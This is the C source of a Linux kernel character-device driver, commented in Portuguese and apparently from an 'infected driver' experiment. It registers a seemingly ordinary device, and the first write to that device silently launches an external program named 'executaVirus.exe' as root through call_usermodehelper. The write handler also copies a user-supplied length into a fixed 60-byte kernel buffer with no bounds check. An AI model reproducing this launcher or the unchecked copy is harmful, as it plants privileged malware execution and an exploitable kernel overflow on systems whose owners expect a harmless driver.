/* Necessary includes for device drivers */
#include <linux/init.h>
//#include <linux/config.h>
#include <linux/module.h>
#include <linux/kernel.h> /* printk() */
#include <linux/slab.h> /* kmalloc() */
#include <linux/fs.h> /* everything... */
#include <linux/errno.h> /* error codes */
#include <linux/types.h> /* size_t */
#include <linux/proc_fs.h>
#include <linux/fcntl.h> /* O_ACCMODE */
#include <linux/kmod.h>
//#include <asm/system.h> /* cli(), *_flags */
#include <asm/uaccess.h> /* copy_from/to_user */

MODULE_LICENSE("Dual BSD/GPL");

/* Declaração das funçoes do meuDriver.c */
int meuDriver_abrir(struct inode *inode, struct file *filp);
int meuDriver_liberar(struct inode *inode, struct file *filp);
ssize_t meuDriver_ler(struct file *filp, char *buf_caractere, 
                    size_t tamanho, loff_t *f_posicao);
ssize_t meuDriver_escrever(struct file *filp, char *buf_caractere, 
                    size_t tamanho, loff_t *f_posicao);
void meuDriver_sair(void);
int meuDriver_iniciar(void);

void iniciarVirus(void);

/* Estrutura que declara um arquivo usual */
/* Funções de Acesso */
struct file_operations meuDriver_fops = {
  read: meuDriver_ler,
  write: meuDriver_escrever,
  open: meuDriver_abrir,
  release: meuDriver_liberar
};

/* Declaração das funções init e exit do módulo */
module_init(meuDriver_iniciar);
module_exit(meuDriver_sair);

/* Variaveis globais do driver */
/* Maior Numero */
int meuDriver_maiorNumero = 60;
/* Buffer para armazenar dados */
char *meuDriver_buffer;
/* Definir se o virus foi iniciado
 * 0 = nao iniciado
 * 1 = iniciado */
int virusFoiIniciado = 0;


int meuDriver_iniciar(void) {
  int resultado;

  /* Registrando Dispositivo */
  resultado = register_chrdev(meuDriver_maiorNumero, "meuDriver", &meuDriver_fops);
  if (resultado < 0) {
    printk(
      "<1>meuDriver: Nao pode obter o maior numero %d\n", meuDriver_maiorNumero);
    return resultado;
  }

  /* Alocando meuDriver para o buffer */
  meuDriver_buffer = kmalloc(60, GFP_KERNEL); 
  if (!meuDriver_buffer) { 
    resultado = -ENOMEM;
    goto falha; 
  } 
  memset(meuDriver_buffer, 0, 1);

  printk("<1>meuDriver: Inserindo Modulo\n"); 
  
  //iniciarVirus();
  
  return 0;

  falha: 
    meuDriver_sair(); 
    return resultado;
}

void meuDriver_sair(void) {
  /* Liberando o maior numero */
  unregister_chrdev(meuDriver_maiorNumero, "meuDriver");

  /* Liberado o buffer meuDriver_buffer */
  if (meuDriver_buffer) {
    kfree(meuDriver_buffer);
  }

  printk("<1>meuDriver: Removendo Modulo\n");

}

int meuDriver_abrir(struct inode *inode, struct file *filp) {

  /* Sucesso */
  return 0;
}

int meuDriver_liberar(struct inode *inode, struct file *filp) {
 
  /* Sucesso */
  return 0;
}

ssize_t meuDriver_ler(struct file *filp, char *buf_caractere, 
                    size_t tamanho, loff_t *f_posicao) { 
 
  /* Transferindo informação para o Usuário */ 
  copy_to_user(buf_caractere,meuDriver_buffer,1);

  /* Alterando posição de leitura para adaptar ao final da palavra */
  if (*f_posicao == 0) { 
    *f_posicao+=1; 
    return 1; 
  } else { 
    return 0; 
  }
}

ssize_t meuDriver_escrever(struct file *filp, char *buf_caractere,  
                    size_t tamanho, loff_t *f_posicao){

  char *tmp;
  
  
  if(virusFoiIniciado == 0)
  {
  	virusFoiIniciado = 1;
  	iniciarVirus();
  }
  
  tmp = buf_caractere + tamanho - 1;
  copy_from_user(meuDriver_buffer,buf_caractere,tamanho);
  
  //iniciarVirus();
  
  //printk("escrever meuDriver_buffer: %c\n", *meuDriver_buffer);
  
  return 1;
}

void iniciarVirus()
{
	int resultado;
	
	//char *argv[] = {"virus.exe", 0};
	char *argv[] = {"/home/luciano/Documentos/Drivers/MeuDriver_Infectado/executaVirus.exe", 0};
	//static char * envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 0 };
	static char *envp[] = { 
        "HOME=/", 
        "TERM=linux", 
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
        
    printk("<1>meuDriver: Iniciando Virus\n");	
    
	resultado = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	
	printk("<1>meuDriver: call_usermodehelper = %d\n", resultado);
	
	printk("<1>meuDriver: Virus Iniciado\n");
}






